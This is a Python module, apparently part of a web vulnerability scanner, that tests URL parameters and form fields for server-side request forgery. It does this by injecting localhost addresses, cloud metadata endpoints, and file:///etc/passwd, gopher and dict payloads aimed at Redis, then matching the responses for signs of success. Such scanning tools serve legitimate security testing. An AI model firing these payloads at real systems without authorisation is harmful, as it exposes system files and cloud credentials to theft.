"""SSRF (Server-Side Request Forgery) Detection Module."""

import re
from modules.base import BaseModule
from lib.logger import log


class SSRFModule(BaseModule):
    """Detect Server-Side Request Forgery vulnerabilities."""

    name = "ssrf"
    description = "SSRF detection via URL parameter injection and internal resource probing"

    # Common internal targets to test
    INTERNAL_TARGETS = [
        "http://127.0.0.1",
        "http://localhost",
        "http://0.0.0.0",
        "http://[::1]",
        "http://169.254.169.254",  # AWS metadata
        "http://metadata.google.internal",  # GCP metadata
        "http://169.254.169.254/metadata/instance",  # Azure metadata
    ]

    # URL parameters that often accept URLs
    URL_PARAMS = [
        "url", "uri", "link", "href", "src", "dest", "redirect",
        "redirect_url", "redirect_uri", "return_url", "next",
        "target", "feed", "img", "image", "page", "path",
        "callback", "webhook", "proxy", "fetch", "load",
    ]

    # Protocol handlers to test
    PROTOCOLS = [
        "file:///etc/passwd",
        "dict://127.0.0.1:6379/info",
        "gopher://127.0.0.1:6379/_INFO",
        "http://127.0.0.1:22",
        "http://127.0.0.1:3306",
        "http://127.0.0.1:6379",
        "http://127.0.0.1:8080",
    ]

    def run(self, param_urls, forms):
        """Run SSRF detection."""
        # Test URLs with parameters
        for url in param_urls:
            params = self.get_params(url)
            for param in params:
                # Check if param name looks like it accepts URLs
                is_url_param = any(kw in param.lower() for kw in self.URL_PARAMS)
                if is_url_param:
                    self._test_ssrf(url, param, aggressive=True)
                else:
                    self._test_ssrf(url, param, aggressive=False)

        # Test forms
        for form in forms:
            self._test_form(form)

        return self.findings

    def _test_ssrf(self, url, param, aggressive=False):
        """Test a parameter for SSRF."""
        # Canary-based detection: use a unique URL and check if it's fetched
        canary = f"http://canary-{hash(url + param) % 100000}.burpcollaborator.net"

        # Test 1: Internal IP injection
        targets = self.INTERNAL_TARGETS[:3] if not aggressive else self.INTERNAL_TARGETS
        for target in targets:
            self.delay()
            test_url = self.inject_param(url, param, target)
            try:
                resp = self.client.get(test_url, timeout=5)
                # Check for signs of successful SSRF
                indicators = [
                    "root:", "root:x:", "daemon:",  # /etc/passwd
                    "ami-", "instance-id",  # AWS metadata
                    "redis_version", "connected_clients",  # Redis
                    "mysql", "MariaDB",  # MySQL
                ]
                for indicator in indicators:
                    if indicator in resp.text:
                        self.add_finding(
                            "ssrf", url, param, "critical",
                            f"Internal response contains: {indicator}",
                            target, f"SSRF confirmed - server fetched internal resource: {target}"
                        )
                        if self.ai and self.ai.enabled:
                            analysis = self.ai.analyze_vulnerability(
                                "ssrf", url, param, {"payload": target}, resp.text[:1000]
                            )
                            self.findings[-1].ai_analysis = analysis
                        return

                # Check response time (might indicate connection attempt)
                # Short timeout = connection refused (port closed)
                # Long timeout = connection established (port open)
            except Exception as e:
                log.debug(f"SSRF test error: {e}")

        # Test 2: Protocol handler injection (if aggressive)
        if aggressive:
            for proto_payload in self.PROTOCOLS[:4]:
                self.delay()
                test_url = self.inject_param(url, param, proto_payload)
                try:
                    resp = self.client.get(test_url, timeout=5)
                    if "root:" in resp.text or "redis_version" in resp.text:
                        self.add_finding(
                            "ssrf", url, param, "critical",
                            f"Protocol handler injection successful",
                            proto_payload, f"SSRF via protocol handler: {proto_payload}"
                        )
                        return
                except Exception:
                    pass

    def _test_form(self, form):
        """Test form inputs for SSRF."""
        action = form["action"]
        method = form["method"]
        inputs = form["inputs"]

        for inp in inputs:
            name_lower = inp["name"].lower()
            if not any(kw in name_lower for kw in self.URL_PARAMS):
                continue
            if inp["type"] in ("submit", "button", "hidden", "file"):
                continue

            for target in self.INTERNAL_TARGETS[:3]:
                self.delay()
                data = {}
                for field in inputs:
                    data[field["name"]] = target if field["name"] == inp["name"] else field.get("value", "test")

                try:
                    if method == "POST":
                        resp = self.client.post(action, data=data, timeout=5)
                    else:
                        resp = self.client.get(action, params=data, timeout=5)

                    if any(ind in resp.text for ind in ["root:", "redis_version", "ami-"]):
                        self.add_finding(
                            "ssrf", action, inp["name"], "critical",
                            "SSRF via form field",
                            target, "Server-side request forgery via form input"
                        )
                        return
                except Exception:
                    pass
